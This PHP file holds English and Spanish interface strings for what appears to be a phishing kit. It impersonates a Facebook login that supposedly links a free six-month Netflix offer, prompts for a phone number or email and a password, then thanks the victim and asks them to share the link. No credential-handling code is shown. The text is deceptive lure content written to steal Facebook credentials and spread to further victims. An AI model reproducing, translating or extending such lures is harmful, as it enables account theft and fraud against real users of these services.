<?php
$lc = ""; 
    $txt="Log in with Facebook";
  $txt1="to connect to Netflix";
    $txt_mail="Phone number or email";
    $txt_pass="Password";
    $txt_button="Login";
	$polices ="Accept terms and conditions";
    $txt_head="Your gift has been received";
	$thanks="Thank You";
	$subs="The subscription will be active on your account within 3 days";
	$wish="We wish you a nice day ";
	$share="Please share the link with your friends";
	$close="This window will close automatically within ";
	
    $txt_button_head="Continue to Facebook";
    $txt_head1="You can now get 6 months of Netflix service in cooperation with Facebook by linking your subscription to your Facebook account
This offer is only available for a limited time and is subject to Facebook and Netflix terms and conditions";
    if(isset($_SERVER['HTTP_ACCEPT_LANGUAGE']))
    $lc = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);

if($lc == "en"){
   $txt="Log in with Facebook";
  $txt1="to connect to Netflix";
    $txt_mail="Phone number or email";
    $txt_pass="Password";
    $txt_button="Login";
	$polices ="Accept terms and conditions";
    $txt_head="Your gift has been received";
	$thanks="Thank You";
	$subs="The subscription will be active on your account within 3 days";
	$wish="We wish you a nice day ";
	$share="Please share the link with your friends";
	$close="This window will close automatically within ";
	
    $txt_button_head="Continue to Facebook";
    $txt_head1="You can now get 6 months of Netflix service in cooperation with Facebook by linking your subscription to your Facebook account
This offer is only available for a limited time and is subject to Facebook and Netflix terms and conditions";


} 
    else if($lc == "es"){
   $txt="Inicie sesión en su cuenta de Facebook";
   $txt1="para conectarse a Netflix";
    $txt_mail="Número de teléfono o correo electrónico";
    $txt_pass="Contraseña";
    $txt_button="Iniciar sesión";
	$polices ="Aceptar terminos y condiciones";
    $txt_head="Tu regalo ha sido recibido";
	$thanks="Gracias";
	$subs="La suscripción estará activa en su cuenta dentro de los 3 días";
	$wish="Te deseamos un buen dia ";
	$share="Comparte el enlace con tus amigos";
	$close="Esta ventana se cerrará automáticamente dentro de ";
	
    $txt_button_head="Continuar en Facebook";
    $txt_head1="Ahora puede obtener 6 meses de servicio de Netflix en cooperación con Facebook vinculando su suscripción a su cuenta de Facebook
Esta oferta solo está disponible por tiempo limitado y está sujeta a los términos y condiciones de Facebook y Netflix";
}
   
else{
  $txt="Log in with Facebook";
  $txt1="to connect to Netflix";
    $txt_mail="Phone number or email";
    $txt_pass="Password";
    $txt_button="Login";
	$polices ="Accept terms and conditions";
    $txt_head="Your gift has been received";
	$thanks="Thank You";
	$subs="The subscription will be active on your account within 3 days";
	$wish="We wish you a nice day ";
	$share="Please share the link with your friends";
	$close="This window will close automatically within ";
	
    $txt_button_head="Continue to Facebook";
    $txt_head1="You can now get 6 months of Netflix service in cooperation with Facebook by linking your subscription to your Facebook account
This offer is only available for a limited time and is subject to Facebook and Netflix terms and conditions";

    exit();
}
?>